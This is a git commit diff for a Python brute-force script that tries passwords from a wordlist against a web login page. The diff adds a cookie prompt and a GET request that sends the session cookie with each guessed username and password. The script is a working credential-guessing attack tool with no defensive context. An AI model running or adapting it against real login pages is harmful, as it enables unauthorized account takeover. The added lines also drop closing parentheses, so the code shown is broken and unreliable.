7e3863eaded983fd0a0d91969cd70f6d04581e8d
ericel7erek <ericalaa@ymail.com>
2024-09-28 21:24:10 -0400

    BruteForce

--- BruteForce/bruteforce.py
+++ BruteForce/bruteforce.py
@@ -4,6 +4,7 @@ url = input('[+] Enter Page Url: ')
 username = input('[+] Enter Username For The Account To BruteForce: ')
 password_file = input('[+] Enter The Password File To Use: ')
 login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
+cookie_value = input('[+] Enter Cookie Value: '
 
 def cracking(username, url):
 	for password in passwords:
@@ -15,6 +16,13 @@ def cracking(username, url):
 			'Login': 'submit'
 			}
 		response = requests.post(url, data=data)
+		if cookie_value != '':
+			response = requests.get(url , params={
+                        'username': username,
+                        'password': password,
+                        'Login': 'Login'
+                        }, cookies = {'Cookie': cookie_value}
+
 		if login_failed_string in response.content.decode():
 			pass
 		else:
